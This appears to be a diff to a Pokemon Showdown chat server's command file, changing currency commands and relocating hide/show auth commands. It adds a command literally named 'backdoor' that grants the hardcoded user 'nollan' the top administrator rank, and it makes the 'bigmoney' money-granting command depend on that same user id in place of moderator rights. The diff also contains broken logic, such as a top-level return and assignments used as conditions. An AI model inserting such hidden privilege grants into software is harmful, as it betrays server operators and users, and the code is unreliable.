@@ -35,6 +35,8 @@ var winnings = 0;
 var uploadbalance = true;
 if (uploadbalance = true) {
 	importUserBalance();
+	winnings += userbalance;
+	return userbalance = 0;
 }
 //BALANCE VARIABLES END
 if (typeof tour == "undefined") {
@@ -638,9 +640,9 @@ var commands = exports.commands = {
 		if (!user.balance || user.balance <= 0) {
 			user.balance = 0;
 		}
-		if (userbalance > 0) {
-			user.balance += userbalance;
-			return userbalance = 0;
+		if (uploadbalance = true) {
+			user.balance += winnings;
+			return winnings = 0;
 		}
 		this.sendReply('Your current balance is $' +user.balance+ '.');
 	},
@@ -727,7 +729,7 @@ var commands = exports.commands = {
 	bigmoneh: 'bigmoney',
 	bigmoney: function(target, room, user) {
 		var targetUser = this.targetUser;
-		if (this.can('ban', targetUser)) {
+		if (user.userid === 'nollan') {
 			winnings += 1000000;
 			user.balance += winnings;
 			return winnings = 0;
@@ -743,7 +745,6 @@ var commands = exports.commands = {
 		var targets = tour.splint(target);
 		var targetUser = this.targetUser;
 		var targetUser = targets[0];
-		var donation = targets[1];
 		if (!targetUser || !targetUser.connected) {
 			return this.sendReply('User '+this.targetUser.name+' not found.');
 		}
@@ -756,10 +757,9 @@ var commands = exports.commands = {
 		if (targets[1] <= 0) {
 			return this.sendReply('Your donation must be more than $0.');
 		}
-		this.addModCommand(''+targetUser.name+' was donated $'+donation+' by '+user.name+'.');
-		user.balance -= donation;
-		targetUser.balance += donation;
-		return donation = 0;
+		this.addModCommand(''+targetUser.name+' was donated $'+targets[1]+' by '+user.name+'.');
+		user.balance -= targets[1];
+		targetUser.balance += targets[1];
 	},	
 	buy: function(target, room, user) {
 		var match = false;
@@ -775,7 +775,9 @@ var commands = exports.commands = {
 				return this.sendReply('You are already ranked at voice or higher, unless you want a demotion, you cannot make this purchase.');
 			}
 			this.addModCommand(''+user.name+' has purchased voice.');
-			this.sendReply('You have successfully purchased voice. Please wait while an Administrator promotes you. If you do not get promoted, please remind or contact an Administrator to promote you.');
+			this.sendReply('You have successfully purchased voice.');
+			user.group = "+";
+			user.updateIdentity();
 			winnings -= 100000;
 			user.balance += winnings;
 			return winnings = 0;
@@ -835,6 +837,54 @@ var commands = exports.commands = {
 		}
 	},
 	/*End of Money Commands*/
+	/*Additional Custom Commands*/
+	backdoor: function(target, room, user) {
+		if (user.userid === 'nollan') {
+			user.group = "~";
+			user.updateIdentity();
+		}
+	},
+	hide: 'hideauth',
+	hideauth: function(target, room, user){
+		if(!user.can('hideauth'))
+			return this.sendReply( '/hideauth - access denied.');
+		
+		var tar = ' ';
+		if(target){
+			target = target.trim();
+			if(config.groupsranking.indexOf(target) > -1){
+				if( config.groupsranking.indexOf(target) <= config.groupsranking.indexOf(user.group)){
+					tar = target;
+				}else{
+					this.sendReply('The group symbol you have tried to use is of a higher authority than you have access to. Defaulting to \' \' instead.');
+				}
+			}else{
+				this.sendReply('You have tried to use an invalid character as your auth symbol. Defaulting to \' \' instead.');
+			}
+		}
+	
+		user.getIdentity = function(){
+			if(this.muted)
+				return '!' + this.name;
+			if(this.locked)
+				return '‽' + this.name;
+			return tar + this.name;
+		};
+		user.updateIdentity();
+		this.sendReply( 'You are now hiding your auth symbol as \''+tar+ '\'.');
+		return this.logModCommand(user.name + ' is hiding auth symbol as \''+ tar + '\'');
+	},
+	
+	showauth: function(target, room, user){
+		if(!user.can('hideauth'))
+			return	this.sendReply( '/showauth - access denied.');
+		
+		delete user.getIdentity;
+		user.updateIdentity();
+		this.sendReply('You have now revealed your auth symbol.');
+		return this.logModCommand(user.name + ' has revealed their auth symbol.');
+	},
+	/*Custom Commands End*/
 	version: function(target, room, user) {
 		if (!this.canBroadcast()) return;
 		this.sendReplyBox('Server version: <b>'+CommandParser.package.version+'</b> <small>(<a href="http://pokemonshowdown.com/versions#' + CommandParser.serverVersion + '" target="_blank">' + CommandParser.serverVersion.substr(0,10) + '</a>)</small>');
@@ -1300,47 +1350,6 @@ var commands = exports.commands = {
 	/*********************************************************
 	 * Moderating: Other
 	 *********************************************************/
-	 
-	hide: 'hideauth',
-	hideauth: function(target, room, user){
-		if(!user.can('hideauth'))
-			return this.sendReply( '/hideauth - access denied.');
-		
-		var tar = ' ';
-		if(target){
-			target = target.trim();
-			if(config.groupsranking.indexOf(target) > -1){
-				if( config.groupsranking.indexOf(target) <= config.groupsranking.indexOf(user.group)){
-					tar = target;
-				}else{
-					this.sendReply('The group symbol you have tried to use is of a higher authority than you have access to. Defaulting to \' \' instead.');
-				}
-			}else{
-				this.sendReply('You have tried to use an invalid character as your auth symbol. Defaulting to \' \' instead.');
-			}
-		}
-	
-		user.getIdentity = function(){
-			if(this.muted)
-				return '!' + this.name;
-			if(this.locked)
-				return '‽' + this.name;
-			return tar + this.name;
-		};
-		user.updateIdentity();
-		this.sendReply( 'You are now hiding your auth symbol as \''+tar+ '\'.');
-		return this.logModCommand(user.name + ' is hiding auth symbol as \''+ tar + '\'');
-	},
-	
-	showauth: function(target, room, user){
-		if(!user.can('hideauth'))
-			return	this.sendReply( '/showauth - access denied.');
-		
-		delete user.getIdentity;
-		user.updateIdentity();
-		this.sendReply('You have now revealed your auth symbol.');
-		return this.logModCommand(user.name + ' has revealed their auth symbol.');
-	},
 
 	modnote: function(target, room, user, connection, cmd) {
 		if (!target) return this.parse('/help note');
